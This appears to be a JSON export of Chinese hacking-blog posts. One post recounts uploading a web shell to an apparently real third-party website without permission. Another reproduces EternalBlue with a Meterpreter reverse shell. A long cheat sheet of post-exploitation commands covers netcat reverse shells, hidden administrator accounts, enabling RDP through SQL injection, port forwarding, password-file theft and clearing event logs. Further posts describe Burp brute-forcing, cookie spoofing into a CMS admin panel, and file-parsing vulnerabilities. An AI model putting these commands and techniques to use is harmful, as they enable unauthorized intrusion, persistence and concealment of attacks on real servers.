[{"title":"","date":"2017-05-16T15:41:46.124Z","path":"2017/05/16/友情测试--tnpm/","text":"title： 友情测试上课无聊，断开了教师机控制，插入U盘读取一波工具友情找了某个网站测试了一波性能。 网站类型：IIS7.5+伪静态(PHP)+WINNT+MYSQL+WAF2.0IP： 183.61.**.** 可利用点注册：上传文件获取shell搜索框：具有注入效应（后被发现注入失败。）下载：越权下载文件商城：逻辑漏洞 过程0x1伪注册了个邮箱：选择了张PHP类型JPG图片马上传，经过抓包修改后缀–&gt;失败，服务器端有验证后缀修改mine和后缀–&gt;失败，服务器端双重验证； –&gt;失败，把我分号后面的去掉了，然后再验证后缀名00阶段–&gt;失败，我也不知道怎么就失败了。。忘了传图片（内容是马）–&gt;失败，被WAF拦截了。传图片马（马和图片融合，利用命令行）–&gt;当然也失败，，虽然知道结果依然是这样。。 过程0x2最后下面：上多几个过狗马（JPG），上到第3张，貌似成功了。读取到了图片，但是利用是个问题，，因为图片不可能解析，看了下以前的文章，发现博客有个IIS7.x（uginx也有此漏洞）的解析漏洞，qq.jpg/.php（在图片URL后面加/.php）成功使JPG运行了PHP代码 过程0x3明天有空再更新提权吧。该睡觉了。（听说ISCC又出新题了，，）","tags":[]},{"title":"SQLMAP 网页版命令生成器","date":"2017-05-15T14:48:43.179Z","path":"2017/05/15/SQLMAP网页版命令生成器/","text":"白天上课，晚上练车我竟然还能抽出时间来搞ISCC？搞笑，我还能抽出时间泡妞呢。 说笑了。 挺感慨这次的ISCC的，虽然还没结束，但是想起上一次我800分就被拉去决赛的我顿时心里充满激动。反而这次的2485分（目前满分3850）竟然连100名都进不了，，这是什么鬼。。 不过收获要是蛮多了，特别是代码审计和上传。等比赛后再写篇writeup记录下此次失败的比赛吧。 唉，累了，逛逛博客，发现SQLMAP网页版懒人必备命令生成器分享下，仔细研究的话发现原来QLMAP的命令是如此的多，， 主要用于SQLMAP命令懒得手打的我。同时也能通过此网页学习更多限量级命令。 文件下载：https://pan.baidu.com/s/1skMR47N密码：6666","tags":[]},{"title":"方程式 Eternalblue 漏洞利用复现","date":"2017-04-29T13:28:48.815Z","path":"2017/04/29/方程式 Eternalblue 漏洞利用复现/","text":"影响版本12000/xpSp0/1/2/3/2003Sp0/1/2/3、VistaSp0/1/2/2008Sp1/2/xp_x86Sp0/1/2/3xp_x64Sp1/2/2003ServerSp0/1/2/Server2008Sp0/1/2/win7Sp0/1/Server2008R20/1/Win8Sp0/Server2012Sp0 利用条件1.开启了445端口即可。2.大多数版本需要关闭防火墙。 漏洞原理:http://www.91ri.org/16946.html(我看了半天愣是没看懂)然后找了个比较简明的看：123首先SrvOs2FeaListToNt首先调用SrvOs2FeaListSizeToNt计算pNtFea的大小。这里注意了SrvOs2FeaListSizeToNt函数会修改原始的pOs2Fea中的Length大小,本来Length是一个DWORD, 代码还强制转换成了WORD,不能不让人联想一些事。然后以计算出来的Length来分配pNtFea.最后调用SrvOs2FeaToNt来实现转换。SrvOs2FeaToNt后面的判断就有问题了。这里还不止一个问题。 1. 转换完成后，增加pOs2FeaBody然后比较。正确的逻辑难道不应该是先判断再转换吗？ 2. 由于SrvOs2FeaListSizeToNt中改变了pOs2Fea的length的值，这里使用变大后的值做比较，肯定会越界。 环境搭建靶机：Win7 旗舰版 x64 关闭防火墙 IP：192.168.26.129 开放445端口攻击机A：win7 旗舰版 x64 python2.6（32位）、对应的pywin32 IP :192.168.26.129攻击机B：kali2.0/任意安装了msf的Linux/可以被反弹获取后门权限的设备这里我用的是kali2.0 IP:192.168.26.128 （没错，靶机和攻击机A是同一台，因为电脑配置渣，开不起第三台我就双向利用了。） exp下载链接：https://github.com/misterch0c/shadowbroker 复现步骤1.在攻击机A安装好python-2.6.6.msi，pywin32-221.win32-py2.6.exe 2.在攻击机B先生成一个payload。启动MSF。因为靶机为win7、X64位。启动后对应的命令为:msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.26.128 LPORT=5555 -f dll &gt;test.dll（注意创建的） 3.把生成的payload传给攻击机A。 4.打开EXP。即fb.py(现在根目录创建listeningposts文件，或者打开fb.py注释有关listeningposts的条目) 输入： 5.跳到fb后输入: 6.一直回车确定，直到出现 7.一直回车，直到出现如图，开始跳到Doublepulsar模块 8.一直回车，直到出现如图再选择： 9.一直回车，直到出现 10.返回攻击机A，查看msf,发现已成功反弹，执行shell命令。 11.成功得到System的权限并使用CMD命令进行相应操作。 得到的反弹shell还可执行的其它操作1.在第10步输入help，可查看此shell能执行的操作screenshot 截图桌面webcam_snap 拍照功能。 。。。 隐藏利用命令开3389，并且创建隐藏账户利用system权限远程下载一个远控","tags":[]},{"title":"提权技巧","date":"2017-04-26T00:52:55.977Z","path":"2017/04/26/提权/","text":"提权：在我们拿到一个webshell之后，我们需要得到服务器的权限，从webshell权限到服务器的权限是一种提权。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而当我们是一个普通用户的时候，提升到服务器的超级用户的过程，这也是一种提权。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般我们都是使用菜刀的功能(虚拟终端)提权 1.cmd拒绝访问就自己上传一个cmd.exe，自己上传的cmd是不限制后缀的，还可以是cmd.com cmd.txt cmd.rar 2.net user不能执行有时候是net.exe被删除了，可以先试试net1，不行就自己上传一个net.exe 3.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\\RECYCLER\\pr.exe，命令那里清空(包括/c )输入”net user key daxia /add” 4.有时候因为监控而添加用户失败，试试上传“PwDump7 破解当前管理密码(hash值)”俩个都上传，执行PwDump7.exe就可以了，之后解密哈希值得到铭文，建 议重定向结果到保存为1.txt /c c:\\windows\\temp\\cookies\\PwDump7.exe &gt;1.txt 5.有时候权限很松，很多命令都可以执行，但是就是增加不上用户，这时候你就要考虑是不是因为密码过于简单或是过于复杂了 6.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令 7.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators 8.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:\\xxx\\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在 cmd那里，下面不变 9.当添加不上用户却可以添加“增加用户的Vbs、bat）的时候，就添加一个吧，然后用“直接使服务器蓝屏重启的东东”让服务器重启就提权成功 10.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\\windows\\temp\\cmd.exe 设置终端路径为：c:\\windows\\temp\\cmd.exe 11.支持aspx但跨不了目录的时候，可以上传一个读iis的vbs，执行命令列出所有网站目录，找到主站的目录就可以跨过去了，上传cscript.exe到可执行目录， 接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\\windows\\temp\\cookies\\cscript.exe” d:\\web\\iispwd.vbs 11.如何辨别服务器是不是内网？192.168.x.x 172.16.x.x 10.x.x.x 12.安全狗下加用户的语句：：for /l %i in (1,1,1000) do @net user test test /add&amp;@net localgroup administrators test /add 13.21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle、5631对应的pcanywhere 14.劫持提权，说到这个，想必肯定会想到lpk.dll这类工具，有时候在蛋疼怎么都加不上账户的时候，可以试试劫持shift、添加开机启动等等思路 15.提权成功但3389端口没开，执行语句或是工具开3389失败的时候，可以上传rootkit.asp，登陆进去就是system权限，这时候再尝试开3389希望较大 常用DOS命令查看版本：ver 查看权限：whoami 查看配置：systeminfo 查看用户：net user 查看进程：tasklist 查看正在运行的服务：tasklist /svc 查看开放的所有端口：netstat -ano 查询管理用户名：query user 查看搭建环境：ftp 127.0.0.1 查看指定服务的路径：sc qc Mysql 添加一个用户：net user key key001 /add 提升到管理权限：net localgroup administrators key /add 添加用户并提升权限：net user key key001 /add &amp; net localgroup administrators key /add 查看制定用户信息：net user key 查看所有管理权限的用户：net localgroup administrators 加入远程桌面用户组：net localgroup “Remote Desktop Users” key /add 突破最大连接数：mstsc /admin /v:127.0.0.1 删除用户：net user key /del 删除管理员账户:net user administrator key001 更改系统登陆密码：net password key001 激活GUEST用户：net user guest /active:yes 开启TELNET服务：net start telnet 关闭麦咖啡：net stop “McAfee McShield” 关闭防火墙：net stop sharedaccess 查看当前目录的所有文件：dir c:\\windows\\ 查看制定文件的内容：type c:\\windows\\1.asp 把cmd.exe复制到c:\\windows的temp目录下并命名为cmd.txt：copy c:\\windows\\temp\\cookies\\cmd.exe c:\\windows\\temp\\cmd.txt 开3389端口的命令：REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f 查看补丁：dir c:\\windows>a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo%i Not Installed!)&amp;del /f /q /a a.txt 常见杀软360tray.exe 360实时保护ZhuDongFangYu.exe 360主动防御KSafeTray.exe 金山卫士McAfee McShield.exe 麦咖啡SafeDogUpdateCenter.exe 服务器安全狗 windows提权中敏感目录和敏感注册表的利用敏感目录 目录权限 提权用途 C:\\Program Files\\ 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件C:\\Documents and Settings\\All Users\\「开始」菜单\\程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径C:\\Documents and Settings\\All Users\\Documents Everyone完全控制权限 上传执行cmd及expC:\\windows\\system32\\inetsrv\\ Everyone完全控制权限 上传执行cmd及expC:\\windows\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件C:\\windows\\system32\\ 默认用户组users拥有查看权限 Shift后门一般在该文件夹，可以下载后门破解密码C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行C:\\RECYCLER\\D:\\RECYCLER\\ Everyone完全控制权限 回收站目录。常用于执行cmd及expC:\\Program Files\\Microsoft SQL Server\\ 默认用户组users对该目录拥有查看权限 有时候该目录也存在可执行权限C:\\Program Files\\MySQL\\ 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的rootC:\\oraclexe\\ 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权C:\\WINDOWS\\system32\\config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权C:\\Program Files\\Geme6 FTP Server\\Remote Admin\\Remote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码c:\\Program Files\\RhinoSoft.com\\Serv-U\\c:\\Program Files\\Serv-U\\ 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码c:\\windows\\system32\\inetsrv\\MetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件 C:tomcat5.0\\conf\\resin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置C:\\ZKEYS\\Setup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置 提权中的敏感注册表位置HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSSQLServer\\MSSQLServer\\SuperSocketNetLib\\Tcp Mssql端口 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server DenyTSConnections 远程终端 值为0 即为开启 HKEY_LOCAL_MACHINE\\SOFTWARE\\MySQL AB\\ mssql的注册表位置 HKEY_LOCAL_MACHINE\\SOFTWARE\\HZHOST\\CONFIG\\ 华众主机注册表配置位置 HKEY_LOCAL_MACHINE\\SOFTWARE\\Cat Soft\\Serv-U\\Domains\\1\\UserList\\ serv-u的用户及密码（su加密）位置 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\ WinStations\\RDP-Tcp 在该注册表位置PortNumber的值即位3389端口值 HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers mysql管理工具Navicat的注册表位置，提权运用请谷歌 HKEY_LOCAL_MACHINE\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权 HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Services\\MSFtpsvc\\Parameters\\Virtual Roots\\ IIS注册表全版本泄漏用户路径和FTP用户名漏洞 HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\Settings\\mastersvrpass 华众主机在注册表中保存的mssql、mysql等密码 HKEY_LOCAL_MACHINE\\SYSTEM\\LIWEIWENSOFT\\INSTALLFREEADMIN\\11 星外主机mssql的sa账号密码，双MD5加密 HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Services\\MSFtpsvc\\Parameters\\Virtual Roots\\ControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003。 SQL语句直接开启33893389登陆关键注册表位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\DenyTSConnections 其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。 而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。 开启3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\\CurrentControlSet\\Control\\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;– 关闭3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\\CurrentControlSet\\Control\\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,1;– 2003可以实现一句话开3389： reg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp” /v PortNumber /t REG_DWORD /d 80 /f wscript.shell的删除和恢复卸载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%\\system32\\WSHom.Ocx卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%\\system32\\scrrun.dll卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:\\ProgramFiles\\CommonFiles\\System\\ado\\msado15.dll” 如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了 如何找到准确的终端连接端口？在aspx大马里，点击“系统信息”第三个就是目前的3389端口或是执行命令查看正在运行的服务：tasklist /svc找到：svchost.exe 1688 TermService记住1688这个ID值，查看开放的所有端口：netstat -ano找到1688这个ID值所对应的端口就是3389目前的端口 iis6提权提示Can not find wmiprvse.exe的突破方法突破方法一：在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉 在结束之后，它会再次运行，这时候的PID值的不一样的，这时候我们回来去运行exp，直接秒杀。 突破方法二：虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东” 甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。 本地溢出提权计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了. 缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的. 利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组. 想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令. Mssql提权扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件 也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。 aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即 可 增加一个用户：exec master.dbo.xp_cmdshell ‘net user key key001 /add’;– 提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators key /add’;– PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建命令：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’) 1433一句话开3389： Exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\\CurrentControlSet\\Control\\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;– mysql提权利用mysql提权的前提就是,服务器安装了mysql，mysql的服务没有降权，是默认安装以系统权限继承的(system权限).并且获得了root的账号密码 如何判断一台windows服务器上的mysql有没有降权？ cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了 如何判断服务器上是否开启了mysql服务？ 开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的. 如何查看root密码？ 在mysql的安装目录下找到user.myd这个文件，连接信息就在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户，在conn.asp config.asp这 些文件里，可以用PHP脚本的文件搜索功能搜索这两个文件，找到之后编辑就可以找到连接信息，有时会显得很乱，这时就需要自己去组合，前17位在第一行可以 找到，还有23位在第三行或是其他行，自己继续找。 可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。 填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。 PS：5.0版本以下(包括5.0的)默认c:\\windows\\系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的 lib/plugin目录中，例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll serv-u提权这个文件里包含serv-u的md5密码：C:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini 找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2 再拿md5密文去解密，再用现在的密码登陆提权即可。 serv-u提权的前提是43958端口开了，且知道帐号密码！ 如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。 530说明密码不是默认的,回显330说明成功，900说明密码是默认的 在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。 端口转发什么情况下适合转发端口？ 1.服务器是内网，我们无法连接。 2.服务器上有防火墙，阻断我们的连接。 转发端口的前提，我们是外网或是有外网服务器。 找个可读可写目录上传lcx.exe 本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口） 接着shell命令：/c c:\\windows\\temp\\cookies\\lcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口） 之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了) 以上是本机外网情况下操作，接着说下在外网服务器里如何操作： 上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567 接着在aspx shell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。 NC反弹提权当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。 不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了…. 找个可读可写目录上传nc.exe cmd.exe -l 监听本地入栈信息 -p port打开本地端口 -t 以telnet形式应答入栈请求 -e 程序重定向 本地cmd执行：nc -vv -l -p 52 进行反弹 接着在shell里执行命令：c:\\windows\\temp\\nc.exe -vv 服务器ip 999 -e c:\\windows\\temp\\cmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小 很多 执行成功后本地cmd命令：cd/ （只是习惯而已） 接着以telnet命令连接服务器：telnet 服务器ip 999 回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！ PS：一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:\\windows\\temp\\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\\windows\\temp\\cmd.exe 这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的 星外提权如何知道是不是星外主机？ 第一：网站物理路径存在“freehost” 第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹 默认帐号：freehostrunat 默认密码：fa41328538d7be36e83ae91a78a1b16f!7 freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可 （ee.exe提权法） 找个可读可写目录上传ee.exe cmd命令：/c c:\\windows\\temp\\cookies\\ee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724） 接着命令：/c c:\\windows\\temp\\cookies\\ee.exe -u 724 （获取星外的帐号密码） （vbs提权法） 找个可读可写目录上传cscript.exe和iispwd.vbs cmd执行：/c “c:\\windows\\temp\\cookies\\cscript.exe” c:\\windows\\temp\\cookies\\iispwd.vbs 意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录 360提权找个可读可写目录上传360.exe cmd命令：/c c:\\windows\\temp\\cookies\\360.exe 会提示3段英文： 360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2 You will get a Shift5 door! Shift5 Backdoor created! 这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了…… 华众虚拟主机提权就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞 所以华众提权关键之处就是搜集信息，主要注册表位置： HKEY_LOCAL_MACHINE\\SOFTWARE\\HZHOST\\CONFIG\\ HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mysqlpass root密码 HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mssqlpss sa 密码 c:\\windows\\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码 以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用 百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具 脱库Access数据库脱库很简单，直接下载数据库即可，mssql数据库可以用shell自带的脱裤功能，找到数据库的连接信息，一般在web.config.asp里，然后连接一 下SA，找到会员表（UserInfo）就可以了。 mysql数据库脱库，找到root帐号密码，用PHP大马自己带链接功能连接一下，也自己自己上传PHP脱裤脚本，之后找到目标数据库（数据库名），再找到会员表 menber进行脱裤即可。 服务器安全命令提示符已被系统管理员停用？ 解决方法：运行→gpedit.msc→用户配置→管理模板→系统，在右侧找到”阻止命令提示符”, 然后双击一下,在”设置”里面选中”未配置” ,最后点击”确定”。 如何判断服务器的类型？ 解决方法：直接ping服务器ip，看回显信息进行判断 TTL=32 9X/ME TTL=64 linux TTL=128 2000X/XP TTL=255 UNIX 为什么有时3389开放却不能连接？ 原因分析：有时候是因为防火墙，把3389转发到其他端口就可以连接了，有的转发后依然是连接不上，那是因为管理员在TCP/IP里设置的端口限制 解决方法：我们需要把端口转为TCP/IP里设置的只允许连接的端口其中一个就可以了，更好的办法是取消端口限制。 最简单的往服务器上传东西方法是什么？ 本机打开“HFS网络文件服务器”这款工具，把需要上传的工具直接拖进左边第一个框内，复制上面的地址，到服务器里的浏览器访问，就可以下载了 限制“命令提示符”的运行权限？ 我的电脑（右键）–资源管理器中–点击“工具”按钮，选择“文件夹选项”，切换到“查看”标签，去掉“使用简单文件共享(推荐)”前面的钩，这一步是为 了让文件的属性菜单中显示“安全”标签，然后进入“c:\\windows\\system32\\”，找到“cmd.exe”，点右键选择“属性”，切换到“安全”标签，将其中“组 或用户名称”中除了管理员外的所有用户都删除，完成后点“确定”这样当普通用户想运行“命令提示符”的时候将会出现“拒绝访问”的警告框。 如何更改windows2003最大连接数？ windows2003中的远程桌面功能非常方便，但是初始设置只允许2个用户同时登陆，有些时候因为我在公司连接登陆后断开，同事在家里用其他用户登陆后断开， 当我再进行连接的时候，总是报错“终端服务超过最大连接数”这时候我和同事都不能登陆，通过以下方法来增加连接数，运行：services.msc，启用license logging，别忘了添加完毕后再关闭 License Logging 打开win2k3的控制面板中的“授权”，点“添加许可”输入要改的连接数 如何清除服务器里的IP记录日志？ 1.我的电脑右键管理–事件查看器–安全性–右键清除所有事件 2.打开我的电脑–C盘–WINDOWS–system32–config–AppEvent.Evt属性–安全–全部都拒绝 3.Klaklog.evt属性–安全–全部都拒绝–SecEvent.Tvt属性–安全–全部都拒绝 来源网上收集！！","tags":[]},{"title":"burpsuit爆破后台","date":"2017-04-23T02:01:02.933Z","path":"2017/04/23/burpsuit爆破后台/","text":"此次测试条件：1.没有token验证2.不点击错误提示则不刷新验证码 所以较简单，使用burpsuite即可，1.抓包，并发送去Intrude 2.设置Intrude 其中的attack type 设置如下： Sniper：对变量依次进行破解（依照变量数进行所有字典的组合）Battering ram：对变量同时进行破解（密码和账号是同一个，直至轮完字典）Pitchfork：每个变量对应一个字典（组合为最小字典的数量）Cluster bomb：每个变量对应一个字典，并交集破解（A字典*B字典） 3.设置Intruder的payloads属性： 4.按Start attack 开始爆破: 选择Length不一样的则为爆破成功点。 其中Intruder的options可以设置线程等很多东西。。 因为较简单，所以使用burpsuit。如果需要爆破验证码，可以尝试PKAV工具","tags":[]},{"title":"cookie 欺骗进后台","date":"2017-04-21T10:47:59.249Z","path":"2017/04/21/Cookie欺骗进后台/","text":"听说没有“实战”的博客不是好博客。就下载了个CMS来测试下性能–&gt;phpecms1.3 ###登陆页面： phpecms1.3/admin/cms_check.php文件有一段代码 &lt;?php if(!isset($_COOKIE['admin_name'])){ alert_href('非法登录','cms_login.php'); }; ?&gt; 这代码意思是如果cookie是admin_name 则跳转成功，如果不是则非法登陆。 /phpecms1.3/admin/cms_welcome.php文件： &lt;?php include('../system/inc.php'); include('cms_check.php'); ?&gt; &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt; &lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt; &lt;head&gt; &lt;?php include('inc_head.php') ?&gt; &lt;/head&gt; &lt;body&gt; &lt;?php include('inc_header.php') ?&gt; &lt;div id=\"content\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"line-big\"&gt; &lt;?php include('inc_left.php') ?&gt; &lt;div class=\"xx105\"&gt; &lt;div class=\"hd-1\"&gt;使用声明&lt;/div&gt; &lt;div class=\"bd-1\"&gt; &lt;p&gt;一、遵守中中华人民共和国相关法律，合法使用。&lt;/p&gt; &lt;p&gt;二、此程序为免费版，无使用时间限制。&lt;/p&gt; &lt;p&gt;三、商业使用建议使用收费版，获取更多功能和技术服务。&lt;/p&gt; &lt;p class=\"fb color-red\"&gt;免费版和收费版的主要差异&lt;/p&gt; &lt;p&gt;一、支持手机版&lt;/p&gt; &lt;p&gt;二、多套模板后后台切换&lt;/p&gt; &lt;p&gt;三、更多的频道类型和详情类型选择&lt;/p&gt; &lt;p&gt;四、支持伪静态&lt;/p&gt; &lt;p&gt;四、咨询QQ：&lt;a href=\"http://wpa.qq.com/msgrd?v=3&amp;uin=5474131&amp;site=qq&amp;menu=yes\"&gt;5474131&lt;/a&gt; 电话：13400472755 网址：&lt;a href=\"http://www.pcfinal.cn\" target=\"_blank\"&gt;[url=http://www.pcfinal.cn]www.pcfinal.cn[/url]&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php include('inc_footer.php') ?&gt; &lt;/body&gt; &lt;/html&gt; 后台文件没有任何判断，直接包含进去 ###如图增加新cookie及修改： ###刷新修改过的URL，成功进入后台","tags":[]},{"title":"解析漏洞总结","date":"2017-04-21T00:53:30.382Z","path":"2017/04/21/解析漏洞/","text":"解析漏洞:解析就是把代码用指定语言运行出来,解析漏洞就是在运行的过程中没按照原先设定的计划去把语言运行出来,而是运行了另一种过程。 IIS文件解析漏洞： ①：当建立.asa 、.asp 的格式文件夹时，其目录下的任意文件都以asp的文件来解析。 例子：在asp文件夹下新建一个txt文件，但是访问该TXT文件时，如果有代码为函数，将以asp的方式去解析，去利用该文件 ②：当文件为*.asp;1.jpg时，IIS同时会以asp脚本来执行（分号后面内容不被解析。貌似该漏洞只存在于6.0版本） ③：WebDav扩展漏洞： 此扩展支持：PUT/Move/Copy/Delete等方法 其中PUT方法可用于服务器上传脚本文件（工具有桂林老兵PUT） Move：移动文件 Copy:改动文件，例如改动后缀名使文件变为shell。 Apacher解析漏洞（与IIS有所不同）：① ：假如有个1.php.rar文件内容为&lt;?php phpinfo(); ?&gt;那么打开1.php.rar文件时并不是下载，而是现在phpinfo文件。② ：Apache解析扩展名时从后面解析，直至遇到认识的扩展名为止。 PHP CGI解析漏洞（Nginx服务器漏洞）： 例如：当访问URL=www.baidu.com/1.jpg时显示的是一张图片，但是当加上/.php时就以Php形式去解析这张图片了。 IIS 7.0/IIS 7.5/ Nginx 的文件，然后访问mst.jpg/.php,在这个目录下就会生成一句话木马 shell.php。 在windows环境下：xx.jpg[空格] 或xx.jpg. 